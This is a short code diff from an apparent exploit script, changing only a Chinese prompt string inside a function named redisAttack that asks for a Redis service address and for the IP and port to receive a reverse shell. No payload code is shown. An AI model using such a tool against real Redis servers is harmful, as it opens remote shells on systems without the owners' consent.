@@ -13,7 +13,7 @@ def poc(url):
 
 def redisAttack(url):
     try:
-        redisip = input("请输入有redis服务的ip:(带端口)")
+        redisip = input("请输入有redis服务的地址:(带端口)")
         shell = input("接受反弹shell的iP:")
         port =  input("接受反弹shell的端口:")
     except:
